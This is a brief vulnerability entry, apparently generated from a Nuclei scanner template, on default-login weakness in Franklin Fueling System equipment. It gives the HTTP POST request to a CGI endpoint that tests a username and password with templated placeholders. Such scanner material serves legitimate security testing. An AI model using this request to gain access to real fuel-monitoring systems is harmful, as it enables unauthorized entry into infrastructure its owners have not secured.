# Vulnerability: Franklin Fueling System - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`franklin-fueling-default-login.yaml`)

## Description
A default password vulnerability refers to a security flaw that arises when a system or device is shipped or set up with a pre-configured, default password that is commonly known or easily guessable.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /21408623/cgi-bin/tsaws.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml

<TSA_REQUEST_LIST PASSWORD="{{password}}"><TSA_REQUEST COMMAND="cmdWebCheckRole" ROLE="{{username}}"/></TSA_REQUEST_LIST>
```

